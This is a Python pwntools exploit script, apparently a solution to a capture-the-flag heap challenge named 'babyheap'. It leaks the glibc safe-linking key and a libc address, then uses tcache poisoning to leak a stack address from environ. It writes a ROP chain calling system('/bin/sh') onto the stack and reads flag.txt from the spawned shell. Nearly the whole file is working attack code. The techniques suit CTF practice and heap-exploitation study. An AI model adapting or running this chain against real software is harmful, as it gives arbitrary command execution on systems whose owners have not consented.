from pwn import *

# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

e = ELF('./babyheap', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = e

io = remote(args.HOST or 'localhost', int(args.PORT or '5000'))

def create_chunk(idx, content):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index? ', str(idx).encode())
    io.sendlineafter(b'Content? ', content)


def read_chunk(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index? ', str(idx).encode())
    return io.recvuntil(b'Menu', drop=True)


def update_chunk(idx, content):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index? ', str(idx).encode())
    io.sendlineafter(b'Content? ', content)


def delete_chunk(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index? ', str(idx).encode())


TCACHE_SIZE = 7

# create 10 chunks - 7 to fill the tcache, 2 to be merged and put into smallbin later, and 1 to prevent merging with the wilderness
for i in range(TCACHE_SIZE + 2 + 1):
    create_chunk(i, b'')

# fill the tcache and put 2 chunks in a fastbin
for i in range(TCACHE_SIZE + 2):
    delete_chunk(i)

xor_key = u64(read_chunk(0)[:8])
log.info(f'{xor_key = :016x}')

# trigger malloc_consolidate
io.sendlineafter(b'> ', b'0' * 20_000 + b'9')

# the 2 chunks from the fastbin have been merged and put into a smallbin, hence they contain a pointer to a smallbin root (in libc)
libc_leak = u64(read_chunk(TCACHE_SIZE)[:8])
log.info(f'{libc_leak = :016x}')
libc.address = libc_leak - (0x00007f2776403b90 - 0x00007f2776200000)
log.info(f'{libc.address = :016x}')

next_index = TCACHE_SIZE + 2 + 1

# will be useful later, but need to be allocated now, since tcache poisoning messes up the tcache
victim = next_index
helper = next_index + 1
helper2 = next_index + 2
final = next_index + 3
create_chunk(victim, b'')
create_chunk(helper, b'')

next_index = next_index + 4

# tcache_poisoning, leak the stack address by reading environ from libc
update_chunk(TCACHE_SIZE - 3, p64((libc.sym['environ'] - 24) ^ xor_key))
create_chunk(next_index, b'')
next_index += 1
create_chunk(next_index, b'')
next_index += 1

stack_leak = u64(read_chunk(next_index - 1)[24:32])
log.info(f'{stack_leak = :016x}')

main_rbp = stack_leak - (0x7ffc690b20d8 - 0x7ffc690b1fa0)
log.info(f'{main_rbp = :016x}')

# rop = ROP(libc)
# rop.raw(rop.find_gadget(['ret'])[0])
# rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
# chain = rop.chain()

chain = flat(
    libc.address + 0x0011578d, # ret
    libc.address + 0x0011578c, # pop rdi; ret
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
)

payload = b'A' * 8 + chain
assert len(payload) <= 0x30

delete_chunk(victim)
delete_chunk(helper)

update_chunk(helper, p64(main_rbp ^ xor_key))

create_chunk(helper2, b'')
create_chunk(final, payload)

io.sendlineafter(b'> ', b'0')
io.sendline(b'cat flag.txt')
flag = io.recvuntil(b'}').decode()
print(f'{flag = }')